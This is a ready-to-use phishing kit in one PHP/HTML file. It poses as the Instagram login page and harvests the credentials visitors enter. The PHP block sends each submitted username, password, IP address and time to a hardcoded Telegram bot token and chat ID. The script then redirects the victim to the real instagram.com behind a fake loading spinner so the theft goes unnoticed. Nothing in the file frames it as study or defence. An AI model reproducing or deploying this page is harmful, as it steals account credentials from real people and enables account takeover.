
<?php
if($_POST['user']&&$_POST['pass']){
$user=$_POST['user'];$pass=$_POST['pass'];$ip=$_SERVER['REMOTE_ADDR'];$time=date('H:i:s');$token='8404334776:AAH7lC5aNDdilhVykH7tMsqiCgyWIwzOM60';$chatid='7224961355';$msg="🎯 INSTAGRAM LOGIN\n\n👤 $user\n🔑 $pass\n🌐 IP: $ip\n🕐 $time";$url="https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=".urlencode($msg);file_get_contents($url);header('Location: https://www.instagram.com');exit;}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Instagram</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
* {margin:0;padding:0;box-sizing:border-box}
body {font-family:system-ui;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container {background:#fff;border:1px solid #dbdbdb;max-width:350px;width:100%;padding:40px 24px;text-align:center;border-radius:4px}
.logo {font-size:48px;color:#e4405f;margin-bottom:28px;display:block}
.input-group {margin-bottom:12px;position:relative}
.input-group input {width:100%;padding:14px 16px;border:1px solid #dbdbdb;border-radius:6px;background:#fafafa;font-size:14px;transition:.2s}
.input-group input:focus {outline:none;border-color:#0095f6;background:#fff;box-shadow:0 0 0 3px rgba(0,149,246,.1)}
.login-btn {width:100%;background:#0095f6;color:#fff;border:none;padding:12px;border-radius:6px;font-weight:600;margin:12px 0;cursor:pointer;font-size:14px;transition:.2s}
.login-btn:hover {background:#1877f2;transform:translateY(-1px)}
.loading {display:none;padding:24px;color:#0095f6}
.loading i {margin-right:8px}
.or {position:relative;margin:24px 0;color:#8e8e8e;font-size:13px;font-weight:500}
.or:before,.or:after {content:'';position:absolute;top:50%;width:38%;height:1px;background:#efefef}
.or:before {left:0}.or:after {right:0}
.forgot {color:#00376b;font-size:12px;text-decoration:none;display:inline-block;margin:12px 0;font-weight:500}
@media (max-width:400px) {.container {padding:32px 20px;margin:0}}
</style>
</head>
<body>
<div class="container">
<i class="fab fa-instagram logo"></i>
<form id="form">
<div class="input-group"><input type="text" id="user" placeholder="Phone number, @username, or email" required></div>
<div class="input-group"><input type="password" id="pass" placeholder="Password" required></div>
<button type="submit" class="login-btn">Log in</button>
</form>
<div class="loading" id="load"><i class="fas fa-spinner fa-spin"></i>Logging in...</div>
<a href="#" class="forgot">Forgot password?</a>
<div class="or">OR</div>
</div>
<script>
document.getElementById('form').onsubmit = e => {
e.preventDefault();
document.querySelector('.login-btn').style.display = 'none';
document.getElementById('load').style.display = 'block';
fetch('', {
method: 'POST',
headers: {'Content-Type': 'application/x-www-form-urlencoded'},
body: 'user=' + encodeURIComponent(document.getElementById('user').value) + 
'&pass=' + encodeURIComponent(document.getElementById('pass').value)
}).then(() => {
setTimeout(() => {window.location = 'https://www.instagram.com'}, 1500);
});
}
</script>
</body>
</html>
